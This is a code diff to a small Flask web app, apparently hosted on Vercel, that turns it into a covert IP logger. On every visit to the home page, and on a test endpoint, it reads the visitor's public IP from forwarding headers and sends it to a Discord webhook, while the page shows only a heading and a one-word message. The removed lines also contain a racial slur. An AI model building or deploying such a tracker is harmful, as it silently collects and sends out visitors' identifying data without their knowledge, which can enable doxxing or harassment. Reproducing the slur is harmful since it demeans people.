@@ -1,22 +1,48 @@
 import os
 import json
 import urllib.request
-from flask import Flask
+from flask import Flask, request
 
 app = Flask(__name__)
 
-# Get the Discord webhook from Vercel Environment Variables
+# Discord webhook stored in Vercel Environment Variables
 WEBHOOK_URL = os.environ.get("ATTESTATION_WEBHOOK_URL")
 
 
-def send_webhook():
+def get_visitor_ip():
+    # Vercel forwards the visitor's public IP in this header
+    forwarded_for = request.headers.get("X-Forwarded-For")
+
+    if forwarded_for:
+        return forwarded_for.split(",")[0].strip()
+
+    # Fallback
+    return request.headers.get("X-Real-IP") or request.remote_addr or "Unknown"
+
+
+def send_webhook(ip):
     if not WEBHOOK_URL:
         print("ERROR: ATTESTATION_WEBHOOK_URL is not set")
         return False
 
     payload = {
         "username": "Tyrone",
-        "content": "Nigga Sybau"
+        "embeds": [
+            {
+                "title": "Tyrone",
+                "description": "Tyrone.",
+                "fields": [
+                    {
+                        "name": "🌐 IP Address",
+                        "value": f"`{ip}`",
+                        "inline": False
+                    }
+                ],
+                "footer": {
+                    "text": "Tyrone"
+                }
+            }
+        ]
     }
 
     data = json.dumps(payload).encode("utf-8")
@@ -43,7 +69,9 @@ def send_webhook():
 
 @app.route("/")
 def home():
-    send_webhook()
+    ip = get_visitor_ip()
+
+    send_webhook(ip)
 
     return """
     <!DOCTYPE html>
@@ -53,7 +81,7 @@ def home():
     </head>
     <body>
         <h1>Oculus Taggers</h1>
-        <p>Nigga Sybau</p>
+        <p>bird.</p>
     </body>
     </html>
     """
@@ -61,9 +89,12 @@ def home():
 
 @app.route("/api/test")
 def test():
-    success = send_webhook()
+    ip = get_visitor_ip()
+
+    success = send_webhook(ip)
 
     return {
         "ok": success,
+        "ip": ip,
         "message": "Webhook sent" if success else "Webhook failed"
     }
